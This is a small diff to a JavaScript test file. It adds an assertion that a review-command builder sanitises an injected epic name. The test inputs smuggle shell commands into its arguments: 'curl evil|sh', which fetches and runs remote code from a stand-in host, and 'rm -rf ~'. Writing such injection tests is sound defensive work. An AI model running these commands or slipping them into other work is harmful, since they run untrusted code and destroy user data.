@@ -10646,6 +10646,7 @@ test('doneStepUnapproved: a done review whose every approval is of older content
     const bad = reviewAsItStands('EP-x', 'x; curl evil|sh/architecture.md', 'main && rm -rf ~');
     assert.doesNotMatch(bad, /curl|rm -rf/);
     assert.match(bad, /review <artifact> as it stands .*origin\/<default branch>.*yad gate open EP-x <artifact>/);
+    assert.match(reviewAsItStands('EP-x; rm -rf ~', 'epic.md', 'main'), /review\/<epic>\/epic origin\/main.*yad gate open <epic> epic\.md/);
   } finally { fs.rmSync(D, { recursive: true, force: true }); }
 });
 
